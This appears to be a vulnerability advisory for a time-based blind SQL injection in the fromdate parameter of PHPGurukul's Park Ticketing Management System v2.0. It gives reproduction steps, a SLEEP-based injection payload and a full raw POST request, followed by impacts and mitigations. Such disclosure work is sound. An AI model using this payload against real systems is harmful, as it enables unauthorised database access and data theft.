# SQL Injection Vulnerability in Park Ticketing Management System (normal-bwdates-reports-details.php--fromdate)

## Overview
A SQL Injection vulnerability was discovered in the `normal-bwdates-reports-details.php` file of the **Park Ticketing Management System Project in PHP v2.0** by PHPGurukul. This vulnerability allows remote attackers to execute arbitrary SQL code via the `fromdate` parameter in a POST request.

### Affected Product Details

| **Field**               | **Details**                                                                 |
|-------------------------|----------------------------------------------------------------------------|
| Product Name            | Park Ticketing Management System Using PHP and MySQL                       |
| Vendor                  | PHPGurukul                                                                 |
| Affected Code File      | `normal-bwdates-reports-details.php`                                       |
| Affected Parameter      | `fromdate`                                                                   |
| Method                  | POST                                                                       |
| Type                    | Time-based blind SQL Injection                                             |
| Version                 | v2.0                                                                       |
| Official Website        | https://phpgurukul.com/park-ticketing-management-system-using-php-and-mysql/

---

## Steps to Reproduce
1. **Log in to the Admin Panel**  
   - Access the admin login page and enter valid credentials.
    ![image](https://github.com/baixiaobi/Park/blob/main/screenshot2/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250704163201.png)

2. **Navigate to the Report Section**  
   - Go to the "Report" section and select "Normal People Report."  
   - Choose any date range in the `fromdate` and `todate` input fields.
    ![image](https://github.com/baixiaobi/Park/blob/main/screenshot/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250704104910.png)
3. **Intercept the Request**  
   - Intercept the data packet and find the problematic parameter fromdate
    ![image](https://github.com/baixiaobi/Park/blob/main/screenshot/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250704104921.png)

4. **Confirm the Vulnerability**  
   - Forward the modified request and observe a 10-second delay in the response, confirming the time-based SQL injection.

   - Inject the following payload into the `fromdate` parameter:  
     ```sql
     ' AND (SELECT 7005 FROM (SELECT(SLEEP(10)))JmJX)-- QyUxp
     ```
   - ![image](https://github.com/baixiaobi/Park/blob/main/screenshot/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250704105021.png)
   
     attack payload    
```sql
    POST /Park-Ticketing-Management-System-Project/ptms/normal-bwdates-reports-details.php HTTP/1.1
    Host: 127.0.0.1
    Origin: http://127.0.0.1
    Accept-Language: zh-CN,zh;q=0.9
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/137.0.0.0 Safari/537.36
    Sec-Fetch-Mode: navigate
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip, deflate, br, zstd
    Sec-Fetch-Site: same-origin
    sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
    sec-ch-ua-mobile: ?0
    Cache-Control: max-age=0
    Referer: http://127.0.0.1/Park-Ticketing-Management-System-Project/ptms/between-dates-normalreports.php
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Cookie: PHPSESSID=fn23r331lhk5gbe4nbqrsg821r
    sec-ch-ua-platform: "Windows"
    Upgrade-Insecure-Requests: 1
    Content-Length: 45

    fromdate=2025-07-04' AND (SELECT 7005 FROM (SELECT(SLEEP(10)))JmJX)-- QyUxp&todate=2025-07-16&submit=
```
    


## Impact
- **Data Theft**: Unauthorized access to sensitive database data.  
- **Data Manipulation**: Alteration or deletion of critical data.  
- **Reconnaissance**: Enumeration of database structures for further attacks.  
- **Financial Loss**: Potential service disruption leading to monetary losses.  
- **Reputation Damage**: Loss of user trust due to breaches or downtime.  

---

## Recommended Mitigations
1. **Input Validation**: Sanitize and validate all user inputs.  
2. **Prepared Statements**: Use parameterized queries to prevent SQL injection.  
3. **Output Encoding**: Encode data before rendering it in the application.  
4. **Content Security Policy (CSP)**: Implement CSP to mitigate HTML injection risks.  


